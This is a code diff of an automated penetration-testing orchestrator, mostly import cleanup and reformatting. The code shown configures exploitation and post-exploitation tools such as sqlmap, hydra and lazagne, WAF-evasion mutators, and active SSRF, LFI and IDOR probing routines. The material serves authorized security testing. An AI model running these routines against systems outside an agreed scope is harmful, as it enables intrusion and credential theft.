@@ -25,7 +25,6 @@ import logging
 import os
 import re
 import shlex
-import subprocess
 import time
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
@@ -35,49 +34,32 @@ from typing import Any, Callable, Dict, List, Optional
 
 import httpx
 
+# Passive reconnaissance intelligence
+from aipt_v2.tools.intelligence import (
+    get_zoomeye,
+)
+
 # Scanner integrations
 from aipt_v2.tools.scanners import (
-    AcunetixTool,
-    AcunetixConfig,
     ScanProfile,
-    BurpTool,
-    BurpConfig,
-    NessusTool,
-    NessusConfig,
-    ZAPTool,
-    ZAPConfig,
     get_acunetix,
     get_burp,
     get_nessus,
     get_zap,
-    acunetix_scan,
-    acunetix_vulns,
-    nessus_vulns,
-    zap_alerts,
-    get_all_findings,
-    test_all_connections,
-)
-
-# Passive reconnaissance intelligence
-from aipt_v2.tools.intelligence import (
-    ZoomEyeTool,
-    ZoomEyeConfig,
-    get_zoomeye,
-    zoomeye_domain_search,
 )
 
 # VPS Remote Execution (optional)
 try:
     from aipt_v2.runtime.vps import VPSRuntime, get_vps_runtime
+
     VPS_AVAILABLE = True
 except ImportError:
     VPS_AVAILABLE = False
 
 # Intelligence module - Advanced analysis capabilities
-from aipt_v2.intelligence import (
-    # Vulnerability Chaining - Connect related findings into attack paths
-    VulnerabilityChainer,
+from aipt_v2.intelligence import (  # Vulnerability Chaining - Connect related findings into attack paths
     AttackChain,
+    VulnerabilityChainer,
 )
 
 # AI Checkpoints - Local LLM analysis between phases (NEW)
@@ -87,42 +69,44 @@ try:
         CheckpointResult,
         CheckpointType,
     )
+
     AI_CHECKPOINTS_AVAILABLE = True
 except ImportError:
     AI_CHECKPOINTS_AVAILABLE = False
 
+# Web Crawler - Discover endpoints, forms, and parameters before exploitation
+from aipt_v2.browser.crawler import CrawlConfig, CrawlResult, WebCrawler
+
 # Continue intelligence imports
-from aipt_v2.intelligence import (
-    # AI-Powered Triage - Prioritize by real-world impact
+from aipt_v2.intelligence import (  # AI-Powered Triage - Prioritize by real-world impact; Scope Enforcement - Stay within authorization; Authentication - Test protected resources
     AITriage,
-    TriageResult,
-    # Scope Enforcement - Stay within authorization
-    ScopeEnforcer,
-    ScopeConfig,
-    ScopeDecision,
-    create_scope_from_target,
-    # Authentication - Test protected resources
-    AuthenticationManager,
     AuthCredentials,
+    AuthenticationManager,
     AuthMethod,
+    ScopeConfig,
+    ScopeEnforcer,
+    TriageResult,
+    create_scope_from_target,
 )
 
-# Web Crawler - Discover endpoints, forms, and parameters before exploitation
-from aipt_v2.browser.crawler import WebCrawler, CrawlConfig, CrawlResult
+# Payload Modules - Various attack payloads for security testing
+from aipt_v2.payloads.traversal import PathTraversalPayloads
 
 # API Security Tools - Detection of API-specific vulnerabilities
-from aipt_v2.tools.api_security.api_discovery import APIDiscovery, APIDiscoveryConfig, APIDiscoveryResult
-from aipt_v2.tools.api_security.jwt_analyzer import JWTAnalyzer, JWTFinding
-from aipt_v2.tools.api_security.graphql_scanner import GraphQLScanner, GraphQLConfig, GraphQLScanResult
-
-# Payload Modules - Various attack payloads for security testing
-from aipt_v2.payloads.ssrf import SSRFPayloads
-from aipt_v2.payloads.traversal import PathTraversalPayloads
-from aipt_v2.payloads.templates import TemplateInjectionPayloads
+from aipt_v2.tools.api_security.api_discovery import (
+    APIDiscovery,
+    APIDiscoveryConfig,
+)
+from aipt_v2.tools.api_security.graphql_scanner import (
+    GraphQLConfig,
+    GraphQLScanner,
+)
+from aipt_v2.tools.api_security.jwt_analyzer import JWTAnalyzer
 
 # XXE Payloads - imported conditionally for compatibility
 try:
     from aipt_v2.payloads.xxe import XXEPayloads
+
     XXE_AVAILABLE = True
 except ImportError:
     XXE_AVAILABLE = False
@@ -131,23 +115,31 @@ except ImportError:
 # WAF Bypass Mutations - Payload transformations to evade WAFs
 try:
     from aipt_v2.exploitation.mutations import (
+        CMDMutator,
         SQLiMutator,
         XSSMutator,
-        CMDMutator,
+        get_cmd_variants,
         get_sqli_variants,
         get_xss_variants,
-        get_cmd_variants,
     )
+
     MUTATIONS_AVAILABLE = True
 except ImportError:
     MUTATIONS_AVAILABLE = False
+
     # Provide fallback functions when mutations module not available
-    def get_sqli_variants(payload, limit=10): return [payload]
-    def get_xss_variants(payload, limit=10): return [payload]
-    def get_cmd_variants(payload, limit=10): return [payload]
+    def get_sqli_variants(payload, limit=10):
+        return [payload]
+
+    def get_xss_variants(payload, limit=10):
+        return [payload]
+
+    def get_cmd_variants(payload, limit=10):
+        return [payload]
+
 
 # UI Components for real-time display
-from aipt_v2.ui import LiveFindingsPanel, Colors
+from aipt_v2.ui import Colors, LiveFindingsPanel
 
 logger = logging.getLogger(__name__)
 
@@ -157,23 +149,23 @@ logger = logging.getLogger(__name__)
 # Domain validation pattern (RFC 1123 compliant)
 # Allows: alphanumeric, hyphens (not at start/end), dots for subdomains
 DOMAIN_PATTERN = re.compile(
-    r'^(?!-)'                           # Cannot start with hyphen
-    r'(?:[a-zA-Z0-9]'                   # Start with alphanumeric
-    r'(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?' # Middle can have hyphens
-    r'\.)*'                             # Subdomains separated by dots
-    r'[a-zA-Z0-9]'                      # Domain start
-    r'(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?' # Domain middle
-    r'\.[a-zA-Z]{2,}$'                  # TLD (at least 2 chars)
+    r"^(?!-)"  # Cannot start with hyphen
+    r"(?:[a-zA-Z0-9]"  # Start with alphanumeric
+    r"(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?"  # Middle can have hyphens
+    r"\.)*"  # Subdomains separated by dots
+    r"[a-zA-Z0-9]"  # Domain start
+    r"(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?"  # Domain middle
+    r"\.[a-zA-Z]{2,}$"  # TLD (at least 2 chars)
 )
 
 # IP address pattern (IPv4)
 IPV4_PATTERN = re.compile(
-    r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
-    r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+    r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}"
+    r"(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
 )
 
 # Characters that are dangerous in shell commands
-SHELL_DANGEROUS_CHARS = set(';|&$`\n\r\\\'\"(){}[]<>!')
+SHELL_DANGEROUS_CHARS = set(";|&$`\n\r\\'\"(){}[]<>!")
 
 
 def validate_domain(domain: str) -> str:
@@ -214,8 +206,7 @@ def validate_domain(domain: str) -> str:
         return domain
 
     raise ValueError(
-        f"Invalid domain format: {domain}. "
-        "Expected format: example.com or sub.example.com"
+        f"Invalid domain format: {domain}. " "Expected format: example.com or sub.example.com"
     )
 
 
@@ -234,6 +225,7 @@ def sanitize_for_shell(value: str) -> str:
 
 class Phase(Enum):
     """Pentest phases."""
+
     RECON = "recon"
     SCAN = "scan"
     ANALYZE = "analyze"  # Intelligence analysis (chaining, triage)
@@ -245,6 +237,7 @@ class Phase(Enum):
 
 class Severity(Enum):
     """Finding severity levels."""
+
     CRITICAL = "critical"
     HIGH = "high"
     MEDIUM = "medium"
@@ -255,6 +248,7 @@ class Severity(Enum):
 @dataclass
 class Finding:
     """Security finding from any tool."""
+
     type: str
     value: str
     description: str
@@ -271,6 +265,7 @@ class Finding:
 @dataclass
 class PhaseResult:
     """Result of a phase execution."""
+
     phase: Phase
     status: str
     started_at: str
@@ -285,12 +280,15 @@ class PhaseResult:
 @dataclass
 class OrchestratorConfig:
     """Configuration for the orchestrator."""
+
     # Target
     target: str
     output_dir: str = "./scan_results"
 
     # Scan mode
-    full_mode: bool = True  # Enable all tools including exploitation (default ON for comprehensive scanning)
+    full_mode: bool = (
+        True  # Enable all tools including exploitation (default ON for comprehensive scanning)
+    )
 
     # Output control (clean by default, use -v for verbose)
     verbose: bool = False  # Show verbose output and command results in real-time
@@ -305,26 +303,44 @@ class OrchestratorConfig:
     skip_report: bool = False
 
     # Recon settings - ENHANCED with 10 tools
-    recon_tools: List[str] = field(default_factory=lambda: [
-        "subfinder", "assetfinder", "amass", "httpx", "nmap",
-        "waybackurls", "theHarvester", "dnsrecon", "wafw00f", "whatweb"
-    ])
+    recon_tools: List[str] = field(
+        default_factory=lambda: [
+            "subfinder",
+            "assetfinder",
+            "amass",
+            "httpx",
+            "nmap",
+            "waybackurls",
+            "theHarvester",
+            "dnsrecon",
+            "wafw00f",
+            "whatweb",
+        ]
+    )
 
     # Scan settings - ENHANCED with 8 tools
-    scan_tools: List[str] = field(default_factory=lambda: [
-        "nuclei", "ffuf", "sslscan", "nikto", "wpscan",
-        "testssl", "gobuster", "dirsearch"
-    ])
+    scan_tools: List[str] = field(
+        default_factory=lambda: [
+            "nuclei",
+            "ffuf",
+            "sslscan",
+            "nikto",
+            "wpscan",
+            "testssl",
+            "gobuster",
+            "dirsearch",
+        ]
+    )
 
     # Exploit settings - NEW exploitation tools (enabled in full_mode)
-    exploit_tools: List[str] = field(default_factory=lambda: [
-        "sqlmap", "commix", "xsstrike", "hydra", "searchsploit"
-    ])
+    exploit_tools: List[str] = field(
+        default_factory=lambda: ["sqlmap", "commix", "xsstrike", "hydra", "searchsploit"]
+    )
 
     # Post-exploit settings - NEW privilege escalation tools
-    post_exploit_tools: List[str] = field(default_factory=lambda: [
-        "linpeas", "winpeas", "pspy", "lazagne", "winpwn"
-    ])
+    post_exploit_tools: List[str] = field(
+        default_factory=lambda: ["linpeas", "winpeas", "pspy", "lazagne", "winpwn"]
+    )
 
     # Enterprise scanners
     use_acunetix: bool = True
@@ -343,7 +359,7 @@ class OrchestratorConfig:
 
     # Intelligence/Passive Recon settings
     use_zoomeye: bool = False  # ZoomEye cyberspace search
-    use_shodan: bool = False   # Shodan IoT search (future)
+    use_shodan: bool = False  # Shodan IoT search (future)
     zoomeye_max_results: int = 100  # Max results per query
 
     # Exploit settings
@@ -464,9 +480,14 @@ class Orchestrator:
 
             # Authentication Manager
             self._auth_manager: Optional[AuthenticationManager] = None
-            if self.config.auth_credentials and self.config.auth_credentials.method != AuthMethod.NONE:
+            if (
+                self.config.auth_credentials
+                and self.config.auth_credentials.method != AuthMethod.NONE
+            ):
                 self._auth_manager = AuthenticationManager(self.config.auth_credentials)
-                logger.info(f"Authentication configured: {self.config.auth_credentials.method.value}")
+                logger.info(
+                    f"Authentication configured: {self.config.auth_credentials.method.value}"
+                )
 
             # Analysis results storage
             self.attack_chains: List[AttackChain] = []
@@ -489,6 +510,7 @@ class Orchestrator:
                     KeyValidationBridge,
                     KeyValidationConfig,
                 )
+
                 key_config = KeyValidationConfig(
                     enabled=True,
                     validate_in_realtime=self.config.key_validation_realtime,
@@ -511,6 +533,7 @@ class Orchestrator:
         if self.config.enable_ai_checkpoints and AI_CHECKPOINTS_AVAILABLE:
             try:
                 from aipt_v2.config import get_config
+
                 app_config = get_config()
 
                 self._ai_checkpoint_manager = AICheckpointManager(
@@ -542,6 +565,7 @@ class Orchestrator:
         If a scanner's configuration is present, it gets auto-enabled.
         """
         from aipt_v2.config import get_config
+
         global_config = get_config()
 
         # Acunetix: auto-enable if URL and API key are configured
@@ -563,9 +587,11 @@ class Orchestrator:
             self.config.use_burp = False
 
         # Nessus: auto-enable if URL and access/secret keys are configured
-        if (global_config.scanners.nessus_url and
-            global_config.scanners.nessus_access_key and
-            global_config.scanners.nessus_secret_key):
+        if (
+            global_config.scanners.nessus_url
+            and global_config.scanners.nessus_access_key
+            and global_config.scanners.nessus_secret_key
+        ):
             if not self.config.use_nessus:
                 logger.info("Nessus auto-enabled (configuration detected)")
             self.config.use_nessus = True
@@ -644,6 +670,7 @@ class Orchestrator:
         """Get terminal width, with fallback to 80."""
         try:
             import shutil
+
             return shutil.get_terminal_size().columns
         except Exception:
             return 80
@@ -671,19 +698,19 @@ class Orchestrator:
             return ""
 
         # Strip ANSI escape codes
-        ansi_pattern = re.compile(r'\033\[[0-9;]*[a-zA-Z]|\x1b\[[0-9;]*[a-zA-Z]')
-        output = ansi_pattern.sub('', output)
+        ansi_pattern = re.compile(r"\033\[[0-9;]*[a-zA-Z]|\x1b\[[0-9;]*[a-zA-Z]")
+        output = ansi_pattern.sub("", output)
 
         # Filter junk lines
         clean_lines = []
         junk_patterns = [
-            r'^[\s\[\]\/\|\\-_▰▱█░▓▒○●◉◐◑◒◓⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏\.\d%pP\?\s]*$',  # Progress bars
-            r'^\s*\d+\s*/\s*\d+\s*\[',  # "0 / 1 [___" style progress
-            r'^\s*[\d\.]+%',  # Percentage only lines
-            r'^\s*$',  # Empty lines
+            r"^[\s\[\]\/\|\\-_▰▱█░▓▒○●◉◐◑◒◓⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏\.\d%pP\?\s]*$",  # Progress bars
+            r"^\s*\d+\s*/\s*\d+\s*\[",  # "0 / 1 [___" style progress
+            r"^\s*[\d\.]+%",  # Percentage only lines
+            r"^\s*$",  # Empty lines
         ]
 
-        for line in output.split('\n'):
+        for line in output.split("\n"):
             is_junk = False
             for pattern in junk_patterns:
                 if re.match(pattern, line):
@@ -692,9 +719,11 @@ class Orchestrator:
             if not is_junk and line.strip():
                 clean_lines.append(line)
 
-        return '\n'.join(clean_lines)
+        return "\n".join(clean_lines)
 
-    def _log_tool(self, tool: str, status: str = "running", elapsed: float = None, error: str = None):
+    def _log_tool(
+        self, tool: str, status: str = "running", elapsed: float = None, error: str = None
+    ):
         """Log tool execution with status indicator and elapsed time."""
         # Update live panel with current tool
         if self._live_panel:
@@ -707,14 +736,22 @@ class Orchestrator:
             if status == "running":
                 return
             # Skip "command not found" errors (missing tools) when not verbose
-            if status == "error" and error and ("command not found" in error.lower() or "not found" in error.lower()):
+            if (
+                status == "error"
+                and error
+                and ("command not found" in error.lower() or "not found" in error.lower())
+            ):
                 return
             # Skip section headers like "Subdomain Enumeration" when not verbose
-            if status == "running" and not any(x in tool for x in ["subfinder", "nmap", "nuclei", "httpx"]):
+            if status == "running" and not any(
+                x in tool for x in ["subfinder", "nmap", "nuclei", "httpx"]
+            ):
                 return
 
         icon = "◉" if status == "running" else "✓" if status == "done" else "✗"
-        color_start = "\033[33m" if status == "running" else "\033[32m" if status == "done" else "\033[31m"
+        color_start = (
+            "\033[33m" if status == "running" else "\033[32m" if status == "done" else "\033[31m"
+        )
         color_end = "\033[0m"
 
         # Build status line with optional elapsed time
@@ -725,7 +762,7 @@ class Orchestrator:
         print(status_line, flush=True)
 
         if status == "running" and self.config.verbose:
-            print(f"      → Executing...", flush=True)
+            print("      → Executing...", flush=True)
         elif status == "error" and error and self.config.verbose:
             # Only show errors in verbose mode (except critical ones)
             print(f"      \033[31m→ Error: {error[:100]}\033[0m", flush=True)
@@ -791,7 +828,9 @@ class Orchestrator:
             bar = f"\033[92m{'█' * 30}\033[0m"
             sys.stdout.write(f"\r    {bar} \033[92m100% ✓\033[0m\n")
         elif status == "timeout":
-            sys.stdout.write(f"\r    \033[93m⚠ Timeout - collecting partial results\033[0m" + " " * 20 + "\n")
+            sys.stdout.write(
+                "\r    \033[93m⚠ Timeout - collecting partial results\033[0m" + " " * 20 + "\n"
+            )
         else:
             sys.stdout.write(f"\r    \033[91m✗ {status}\033[0m" + " " * 30 + "\n")
         sys.stdout.flush()
@@ -809,24 +848,26 @@ class Orchestrator:
                 proc = await asyncio.create_subprocess_shell(
                     cmd,
                     stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.STDOUT  # Merge stderr into stdout
+                    stderr=asyncio.subprocess.STDOUT,  # Merge stderr into stdout
                 )
 
                 output_lines = []
 
                 async def read_stream():
                     """Read and display output line by line with heartbeat."""
-                    import sys
+
                     last_output_time = time.time()
                     heartbeat_interval = 30  # Show heartbeat every 30 seconds if no output
 
                     while True:
                         try:
                             # Use wait_for to enable heartbeat checking
-                            line = await asyncio.wait_for(proc.stdout.readline(), timeout=heartbeat_interval)
+                            line = await asyncio.wait_for(
+                                proc.stdout.readline(), timeout=heartbeat_interval
+                            )
                             if not line:
                                 break
-                            decoded = line.decode('utf-8', errors='replace').rstrip()
+                            decoded = line.decode("utf-8", errors="replace").rstrip()
                             output_lines.append(decoded)
                             last_output_time = time.time()
                             if self.config.verbose:
@@ -836,7 +877,10 @@ class Orchestrator:
                             # No output for a while, show heartbeat
                             elapsed = time.time() - last_output_time
                             if self.config.verbose:
-                                print(f"      \033[90m... still running ({elapsed:.0f}s since last output)\033[0m", flush=True)
+                                print(
+                                    f"      \033[90m... still running ({elapsed:.0f}s since last output)\033[0m",
+                                    flush=True,
+                                )
 
                 try:
                     await asyncio.wait_for(read_stream(), timeout=timeout)
@@ -851,15 +895,10 @@ class Orchestrator:
             else:
                 # Silent mode - capture output without displaying
                 proc = await asyncio.create_subprocess_shell(
-                    cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE
+                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                 )
                 try:
-                    stdout, stderr = await asyncio.wait_for(
-                        proc.communicate(),
-                        timeout=timeout
-                    )
+                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                 except asyncio.TimeoutError:
                     # Kill and reap so the external tool is not left running.
                     proc.kill()
@@ -898,10 +937,7 @@ class Orchestrator:
         Returns SQLMap tamper scripts and options to evade WAF detection.
         """
         # Check if WAF was detected in findings
-        waf_finding = next(
-            (f for f in self.findings if f.type == "waf_detected"),
-            None
-        )
+        waf_finding = next((f for f in self.findings if f.type == "waf_detected"), None)
 
         if not waf_finding:
             return ""
@@ -1005,7 +1041,7 @@ class Orchestrator:
                             "permissions_count": len(result.permissions),
                             "resources_count": len(result.resources_accessible),
                             "attack_vectors": result.attack_vectors or [],
-                        }
+                        },
                     )
                     self.findings.append(key_finding)
                     if self.on_finding:
@@ -1023,7 +1059,9 @@ class Orchestrator:
                 "low": "🔵",
                 "info": "⚪",
             }.get(result.risk_level.value, "")
-            logger.info(f"{risk_emoji} Valid {result.key_info.key_type.value.upper()} key found - {result.exploitation_potential or 'See details'}")
+            logger.info(
+                f"{risk_emoji} Valid {result.key_info.key_type.value.upper()} key found - {result.exploitation_potential or 'See details'}"
+            )
 
     def _validate_json_output(self, filepath: Path) -> bool:
         """
@@ -1042,16 +1080,20 @@ class Orchestrator:
             return False
 
         try:
-            content = filepath.read_text(encoding='utf-8')
+            content = filepath.read_text(encoding="utf-8")
             data = json.loads(content)
 
             # Additional validation based on expected structure
             if isinstance(data, list):
-                logger.debug(f"JSON validated: {filepath.name} ({len(data)} items, {file_size} bytes)")
+                logger.debug(
+                    f"JSON validated: {filepath.name} ({len(data)} items, {file_size} bytes)"
+                )
             elif isinstance(data, dict):
                 logger.debug(f"JSON validated: {filepath.name} (object, {file_size} bytes)")
             else:
-                logger.warning(f"JSON validation - unexpected root type in {filepath}: {type(data)}")
+                logger.warning(
+                    f"JSON validation - unexpected root type in {filepath}: {type(data)}"
+                )
 
             return True
 
@@ -1100,12 +1142,12 @@ class Orchestrator:
 
         # Patterns to identify ID-based endpoints
         id_patterns = [
-            r'/(\d+)(?:/|$|\?)',           # /users/123, /orders/456/
-            r'/([a-f0-9-]{36})(?:/|$|\?)',  # UUID patterns /users/abc-123-...
-            r'[?&]id=(\d+)',                # ?id=123
-            r'[?&]user_id=(\d+)',           # ?user_id=123
-            r'[?&]order_id=(\d+)',          # ?order_id=123
-            r'[?&]account=(\d+)',           # ?account=123
+            r"/(\d+)(?:/|$|\?)",  # /users/123, /orders/456/
+            r"/([a-f0-9-]{36})(?:/|$|\?)",  # UUID patterns /users/abc-123-...
+            r"[?&]id=(\d+)",  # ?id=123
+            r"[?&]user_id=(\d+)",  # ?user_id=123
+            r"[?&]order_id=(\d+)",  # ?order_id=123
+            r"[?&]account=(\d+)",  # ?account=123
         ]
 
         # Find endpoints with IDs from crawler discoveries
@@ -1114,11 +1156,9 @@ class Orchestrator:
             for pattern in id_patterns:
                 match = re.search(pattern, endpoint)
                 if match:
-                    id_endpoints.append({
-                        'url': endpoint,
-                        'id_value': match.group(1),
-                        'pattern': pattern
-                    })
+                    id_endpoints.append(
+                        {"url": endpoint, "id_value": match.group(1), "pattern": pattern}
+                    )
                     break
 
         if not id_endpoints:
@@ -1132,8 +1172,8 @@ class Orchestrator:
 
         async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True) as client:
             for ep in id_endpoints[:20]:  # Limit to 20 endpoints
-                url = ep['url']
-                original_id = ep['id_value']
+                url = ep["url"]
+                original_id = ep["id_value"]
 
                 try:
                     # Test 1: Authenticated request (baseline)
@@ -1153,22 +1193,27 @@ class Orchestrator:
                     # BOLA Check 1: Resource accessible without auth
                     if auth_headers and unauth_status == 200 and auth_status == 200:
                         # Check if content is similar (actual data access, not error page)
-                        if len(unauth_response.text) > 100 and abs(len(unauth_response.text) - auth_length) < 500:
-                            findings.append(Finding(
-                                type="bola_no_auth",
-                                value=f"BOLA: Resource accessible without authentication",
-                                description=f"Endpoint {url} returns user data without authentication. "
-                                           f"Authenticated and unauthenticated responses are similar.",
-                                severity="high",
-                                phase="exploit",
-                                tool="bola-test",
-                                target=url,
-                                metadata={
-                                    "auth_status": auth_status,
-                                    "unauth_status": unauth_status,
-                                    "id_value": original_id
-                                }
-                            ))
+                        if (
+                            len(unauth_response.text) > 100
+                            and abs(len(unauth_response.text) - auth_length) < 500
+                        ):
+                            findings.append(
+                                Finding(
+                                    type="bola_no_auth",
+                                    value="BOLA: Resource accessible without authentication",
+                                    description=f"Endpoint {url} returns user data without authentication. "
+                                    f"Authenticated and unauthenticated responses are similar.",
+                                    severity="high",
+                                    phase="exploit",
+                                    tool="bola-test",
+                                    target=url,
+                                    metadata={
+                                        "auth_status": auth_status,
+                                        "unauth_status": unauth_status,
+                                        "id_value": original_id,
+                                    },
+                                )
+                            )
 
                     # Test 3: ID enumeration (try adjacent IDs)
                     if original_id.isdigit():
@@ -1192,21 +1237,23 @@ class Orchestrator:
                                 if enum_response.status_code == 200:
                                     # Check if it's real data, not an error page
                                     if len(enum_response.text) > 200:
-                                        findings.append(Finding(
-                                            type="bola_idor",
-                                            value=f"IDOR: Can access other users' resources",
-                                            description=f"Endpoint allows accessing resource ID {test_id} "
-                                                       f"(original: {original_id}). This may indicate IDOR vulnerability.",
-                                            severity="critical",
-                                            phase="exploit",
-                                            tool="bola-test",
-                                            target=test_url,
-                                            metadata={
-                                                "original_id": original_id,
-                                                "accessed_id": test_id,
-                                                "response_length": len(enum_response.text)
-                                            }
-                                        ))
+                                        findings.append(
+                                            Finding(
+                                                type="bola_idor",
+                                                value="IDOR: Can access other users' resources",
+                                                description=f"Endpoint allows accessing resource ID {test_id} "
+                                                f"(original: {original_id}). This may indicate IDOR vulnerability.",
+                                                severity="critical",
+                                                phase="exploit",
+                                                tool="bola-test",
+                                                target=test_url,
+                                                metadata={
+                                                    "original_id": original_id,
+                                                    "accessed_id": test_id,
+                                                    "response_length": len(enum_response.text),
+                                                },
+                                            )
+                                        )
                                         # Only report once per endpoint
                                         break
                             except Exception:
@@ -1233,8 +1280,8 @@ class Orchestrator:
 
         # Find parameters that might be vulnerable to SSRF
         ssrf_param_patterns = [
-            r'[?&](url|uri|path|dest|redirect|link|src|source|target|file|document|folder|page|host|site|html)=',
-            r'[?&](fetch|load|request|proxy|callback|next|return|continue|goto|reference)=',
+            r"[?&](url|uri|path|dest|redirect|link|src|source|target|file|document|folder|page|host|site|html)=",
+            r"[?&](fetch|load|request|proxy|callback|next|return|continue|goto|reference)=",
         ]
 
         # Collect URLs with potential SSRF parameters
@@ -1247,15 +1294,20 @@ class Orchestrator:
 
         # Also check form parameters
         for form in self.discovered_forms:
-            for inp in form.get('inputs', []):
-                name = inp.get('name', '').lower()
-                if any(kw in name for kw in ['url', 'uri', 'path', 'src', 'link', 'fetch', 'proxy', 'redirect']):
-                    ssrf_candidates.append({
-                        'type': 'form',
-                        'action': form.get('action', self.target),
-                        'method': form.get('method', 'GET'),
-                        'param': inp.get('name'),
-                    })
+            for inp in form.get("inputs", []):
+                name = inp.get("name", "").lower()
+                if any(
+                    kw in name
+                    for kw in ["url", "uri", "path", "src", "link", "fetch", "proxy", "redirect"]
+                ):
+                    ssrf_candidates.append(
+                        {
+                            "type": "form",
+                            "action": form.get("action", self.target),
+                            "method": form.get("method", "GET"),
+                            "param": inp.get("name"),
+                        }
+                    )
 
         if not ssrf_candidates:
             logger.info("No potential SSRF parameters found")
@@ -1296,9 +1348,9 @@ class Orchestrator:
                     try:
                         if isinstance(candidate, dict):
                             # Form-based SSRF
-                            url = candidate['action']
-                            data = {candidate['param']: payload}
-                            if candidate['method'].upper() == 'POST':
+                            url = candidate["action"]
+                            data = {candidate["param"]: payload}
+                            if candidate["method"].upper() == "POST":
                                 response = await client.post(url, data=data, headers=auth_headers)
                             else:
                                 response = await client.get(url, params=data, headers=auth_headers)
@@ -1306,10 +1358,10 @@ class Orchestrator:
                             # URL parameter-based SSRF
                             # Replace the parameter value with payload
                             test_url = re.sub(
-                                r'([?&](url|uri|path|dest|redirect|link|src|source|target|file|fetch|load)=)[^&]*',
+                                r"([?&](url|uri|path|dest|redirect|link|src|source|target|file|fetch|load)=)[^&]*",
                                 lambda m: m.group(1) + payload,
                                 candidate,
-                                flags=re.IGNORECASE
+                                flags=re.IGNORECASE,
                             )
                             response = await client.get(test_url, headers=auth_headers)
 
@@ -1317,23 +1369,29 @@ class Orchestrator:
                         response_text = response.text[:2000]
                         for indicator in ssrf_indicators:
                             if indicator.lower() in response_text.lower():
-                                target_url = candidate if isinstance(candidate, str) else candidate['action']
-                                findings.append(Finding(
-                                    type="ssrf_vulnerability",
-                                    value=f"SSRF: {payload_type} access possible",
-                                    description=f"Server-Side Request Forgery vulnerability detected. "
-                                               f"The server fetched {payload} and returned content containing '{indicator}'.",
-                                    severity="critical" if "metadata" in payload_type else "high",
-                                    phase="exploit",
-                                    tool="ssrf-test",
-                                    target=target_url,
-                                    metadata={
-                                        "payload": payload,
-                                        "payload_type": payload_type,
-                                        "indicator": indicator,
-                                        "response_preview": response_text[:200],
-                                    }
-                                ))
+                                target_url = (
+                                    candidate if isinstance(candidate, str) else candidate["action"]
+                                )
+                                findings.append(
+                                    Finding(
+                                        type="ssrf_vulnerability",
+                                        value=f"SSRF: {payload_type} access possible",
+                                        description=f"Server-Side Request Forgery vulnerability detected. "
+                                        f"The server fetched {payload} and returned content containing '{indicator}'.",
+                                        severity=(
+                                            "critical" if "metadata" in payload_type else "high"
+                                        ),
+                                        phase="exploit",
+                                        tool="ssrf-test",
+                                        target=target_url,
+                                        metadata={
+                                            "payload": payload,
+                                            "payload_type": payload_type,
+                                            "indicator": indicator,
+                                            "response_preview": response_text[:200],
+                                        },
+                                    )
+                                )
                                 # Found SSRF, no need to test more payloads on this endpoint
                                 break
 
@@ -1356,8 +1414,8 @@ class Orchestrator:
 
         # Find parameters that might be vulnerable to LFI
         lfi_param_patterns = [
-            r'[?&](file|path|page|document|folder|root|dir|include|inc|require|location|template|doc|pdf)=',
-            r'[?&](content|load|read|view|display|show|download|filename|name|src|source)=',
+            r"[?&](file|path|page|document|folder|root|dir|include|inc|require|location|template|doc|pdf)=",
+            r"[?&](content|load|read|view|display|show|download|filename|name|src|source)=",
         ]
 
         # Collect URLs with potential LFI parameters
@@ -1370,15 +1428,20 @@ class Orchestrator:
 
         # Also check form parameters
         for form in self.discovered_forms:
-            for inp in form.get('inputs', []):
-                name = inp.get('name', '').lower()
-                if any(kw in name for kw in ['file', 'path', 'page', 'include', 'template', 'doc', 'load']):
-                    lfi_candidates.append({
-                        'type': 'form',
-                        'action': form.get('action', self.target),
-                        'method': form.get('method', 'GET'),
-                        'param': inp.get('name'),
-                    })
+            for inp in form.get("inputs", []):
+                name = inp.get("name", "").lower()
+                if any(
+                    kw in name
+                    for kw in ["file", "path", "page", "include", "template", "doc", "load"]
+                ):
+                    lfi_candidates.append(
+                        {
+                            "type": "form",
+                            "action": form.get("action", self.target),
+                            "method": form.get("method", "GET"),
+                            "param": inp.get("name"),
+                        }
+                    )
 
         if not lfi_candidates:
             logger.info("No potential LFI parameters found")
@@ -1408,19 +1471,19 @@ class Orchestrator:
                 for payload in test_payloads[:5]:  # Test top 5 payloads per endpoint
                     try:
                         if isinstance(candidate, dict):
-                            url = candidate['action']
-                            data = {candidate['param']: payload}
-                            if candidate['method'].upper() == 'POST':
+                            url = candidate["action"]
+                            data = {candidate["param"]: payload}
+                            if candidate["method"].upper() == "POST":
                                 response = await client.post(url, data=data, headers=auth_headers)
                             else:
                                 response = await client.get(url, params=data, headers=auth_headers)
                         else:
                             # Replace parameter value with payload
                             test_url = re.sub(
-                                r'([?&](file|path|page|document|include|template|doc|load|content)=)[^&]*',
+                                r"([?&](file|path|page|document|include|template|doc|load|content)=)[^&]*",
                                 lambda m: m.group(1) + payload,
                                 candidate,
-                                flags=re.IGNORECASE
+                                flags=re.IGNORECASE,
                             )
                             response = await client.get(test_url, headers=auth_headers)
 
@@ -1428,22 +1491,26 @@ class Orchestrator:
                         response_text = response.text
                         for indicator, indicator_type in lfi_indicators.items():
                             if indicator in response_text:
-                                target_url = candidate if isinstance(candidate, str) else candidate['action']
-                                findings.append(Finding(
-                                    type="lfi_vulnerability",
-                                    value=f"LFI: {indicator_type} file exposed",
-                                    description=f"Local File Inclusion vulnerability detected. "
-                                               f"The server returned file contents containing '{indicator}'.",
-                                    severity="critical",
-                                    phase="exploit",
-                                    tool="lfi-test",
-                                    target=target_url,
-                                    metadata={
-                                        "payload": payload,
-                                        "indicator": indicator,
-                                        "indicator_type": indicator_type,
-                                    }
